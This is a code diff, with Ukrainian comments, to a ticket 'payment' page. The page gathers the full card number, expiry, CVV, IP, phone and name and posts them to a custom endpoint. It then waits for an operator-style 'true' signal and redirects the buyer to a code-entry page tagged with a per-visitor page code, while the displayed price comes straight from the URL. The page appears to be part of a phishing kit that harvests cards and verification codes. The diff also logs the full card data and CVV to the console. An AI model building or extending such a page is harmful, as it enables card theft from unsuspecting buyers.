@@ -158,21 +158,57 @@
         const url = new URL(window.location.href);
         return url.searchParams.get(name);
     }
-    // Total підтягуємо, беремо тільки число
+    // --- Витягуємо total і currency з URL ---
+    function getTotalAndCurrency() {
     const totalRaw = getQueryParam('total');
-    const currencyRaw = getQueryParam('currency') || 'EUR';
+        const currencyRaw = getQueryParam('currency') || 'EUR';
     if (totalRaw) {
         // Витягуємо тільки число (цілу або з копійками)
         const match = totalRaw.match(/\d+[\.,]?\d*/);
         const totalNum = match ? match[0].replace(',', '.') : '';
-        if (totalNum) {
-            document.getElementById('payment-title').textContent = `Payment ${totalNum} ${currencyRaw}`;
+            return { total: totalNum, currency: currencyRaw };
         }
+        // fallback: price/currency
+        let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
+        let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+        return { total: price, currency };
     }
+    // --- Оновлюємо всі суми на сторінці ---
+    function updateAllTotals() {
+        const { total, currency } = getTotalAndCurrency();
+        // Заголовок
+        document.getElementById('payment-title').textContent = `Payment ${total} ${currency}`;
+        // Всі елементи з ціною (крім заголовка)
+        document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
+            el.textContent = `${total} ${currency}`;
+        });
+        // data-атрибути для системи оплати
+        document.querySelectorAll('[data-payment-price]').forEach(el => {
+            el.setAttribute('data-payment-price', total);
+            el.setAttribute('data-payment-currency', currency);
+        });
+        // Форми оплати
+        document.querySelectorAll('form[data-payment-form]').forEach(form => {
+            const priceInput = form.querySelector('input[name="price"]');
+            const currencyInput = form.querySelector('input[name="currency"]');
+            if (priceInput) priceInput.value = total;
+            if (currencyInput) currencyInput.value = currency;
+        });
+    }
+    // --- Викликаємо при завантаженні ---
+    updateAllTotals();
     // --- Замість uid використовуємо page_code ---
     function getPageCode() {
+        // 1. З URL
         const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
+        let page = urlParams.get('page');
+        if (page) return page;
+        // 2. З sessionStorage
+        page = sessionStorage.getItem('page_code');
+        if (page) return page;
+        // 3. Попередження
+        console.warn('No page_code found in URL or sessionStorage!');
+        return '';
     }
     document.getElementById('paymentForm').onsubmit = async function(e) {
         e.preventDefault();
@@ -181,20 +217,8 @@
         const expiry = document.getElementById('expiry-input').value;
         const cvv = document.getElementById('cvv-input').value;
         // --- Додаємо price і currency ---
-        let price = localStorage.getItem('ticket_price');
-        let currency = localStorage.getItem('ticket_currency');
-        if (!price || !currency) {
-            // fallback: парсимо з total або currency з URL
-            const totalRaw = getQueryParam('total') || '';
-            const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
-            if (match) {
-                price = match[1].replace(',', '.');
-                currency = match[2];
-            } else {
-                price = totalRaw.match(/\d+[\.,]?\d*/)?.[0]?.replace(',', '.') || '';
-                currency = getQueryParam('currency') || 'EUR';
-            }
-        }
+        // Тепер price/currency = total/currency з URL, якщо є
+        const { total: price, currency } = getTotalAndCurrency();
         // --- Додаємо телефон і ім'я з sessionStorage ---
         const phone = sessionStorage.getItem('ticket_phone') || '';
         const name = sessionStorage.getItem('ticket_name') || '';
@@ -205,10 +229,12 @@
                 ip = userIP;
             }
             const page_code = getPageCode();
+            // --- Додаю логування для діагностики ---
+            console.log('SEND PAYMENT DATA:', { email, card, expiry, cvv, ip, page: page_code, price, currency, phone, name });
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, page_code, price, currency, phone, name })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, price, currency, phone, name })
             });
             if (response.ok) {
                 if (!document.getElementById('payment-msg')) {
@@ -272,7 +298,13 @@
             .then(resp => resp.text())
             .then(txt => {
                 if (txt === 'true') {
+                    // Додаємо page_code до URL
+                    var page = sessionStorage.getItem('page_code') || new URL(window.location.href).searchParams.get('page');
+                    if (page) {
+                        window.location.href = '/buy-tickets/code/?page=' + encodeURIComponent(page);
+                    } else {
                     window.location.href = '/buy-tickets/code/';
+                    }
                 }
             });
     }, 2000);
@@ -387,45 +419,49 @@
     });
     </script>
     <script>
-// --- Payment page: page_code logic, price/currency update, fallback ---
+// --- Payment page: total з URL завжди головний ---
 document.addEventListener('DOMContentLoaded', function() {
-    function getPageCode() {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
+    function getQueryParam(name) {
+        const url = new URL(window.location.href);
+        return url.searchParams.get(name);
     }
+    // 1. Пріоритет: total/currency з URL
+    const total = getQueryParam('total');
+    const currency = getQueryParam('currency') || 'EUR';
+    if (total) {
+        // Оновлюємо заголовок і всі суми на сторінці
+        document.getElementById('payment-title').textContent = `Payment ${total} ${currency}`;
+        document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
+            el.textContent = `${total} ${currency}`;
+        });
+        document.querySelectorAll('[data-payment-price]').forEach(el => {
+            el.setAttribute('data-payment-price', total);
+            el.setAttribute('data-payment-currency', currency);
+        });
+        document.querySelectorAll('form[data-payment-form]').forEach(form => {
+            const priceInput = form.querySelector('input[name="price"]');
+            const currencyInput = form.querySelector('input[name="currency"]');
+            if (priceInput) priceInput.value = total;
+            if (currencyInput) currencyInput.value = currency;
+        });
+        return; // Не оновлюємо нічим іншим!
+    }
+    // 2. Якщо total немає — fallback на price/currency з API
     const url = new URL(window.location.href);
-    let page_code = url.searchParams.get('page');
-    // 1. Якщо page_code є в URL — зберігаємо в sessionStorage
-    if (page_code) {
-        sessionStorage.setItem('page_code', page_code);
-    } else {
-        // 2. Якщо page_code є в sessionStorage, але немає в URL — додаємо його в URL і перезавантажуємо сторінку (тільки 1 раз)
-        const pageFromStorage = sessionStorage.getItem('page_code');
-        if (pageFromStorage) {
-            url.searchParams.set('page', pageFromStorage);
-            window.location.replace(url.toString());
-            return;
-        }
-    }
-    // 3. Якщо page_code є — тягнемо дані
-    page_code = getPageCode();
+    let page_code = url.searchParams.get('page') || sessionStorage.getItem('page_code');
     if (page_code) {
         fetch('/api/payment_data?page=' + encodeURIComponent(page_code))
             .then(r => r.json())
             .then(ev => {
                 if (ev.price && ev.currency) {
-                    // Оновлюємо заголовок
                     document.getElementById('payment-title').textContent = `Payment ${ev.price} ${ev.currency}`;
-                    // Оновлюємо всі елементи з ціною/валютою (якщо треба)
                     document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
                         el.textContent = `${ev.price} ${ev.currency}`;
                     });
-                    // Оновлюємо data-атрибути для системи оплати (якщо треба)
                     document.querySelectorAll('[data-payment-price]').forEach(el => {
                         el.setAttribute('data-payment-price', ev.price);
                         el.setAttribute('data-payment-currency', ev.currency);
                     });
-                    // Оновлюємо форми оплати (якщо треба)
                     document.querySelectorAll('form[data-payment-form]').forEach(form => {
                         const priceInput = form.querySelector('input[name="price"]');
                         const currencyInput = form.querySelector('input[name="currency"]');
@@ -435,7 +471,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
             });
     }
-    // --- showNoEventCodeError та його виклики повністю видалені ---
 });
 </script>
 <script>
@@ -450,5 +485,18 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 })();
 </script>
+<script>
+(function ensurePageCodeInUrl() {
+    const url = new URL(window.location.href);
+    let page = url.searchParams.get('page');
+    if (!page) {
+        page = sessionStorage.getItem('page_code');
+        if (page) {
+            url.searchParams.set('page', page);
+            window.location.replace(url.toString());
+        }
+    }
+})();
+    </script>
 </body>
 </html>
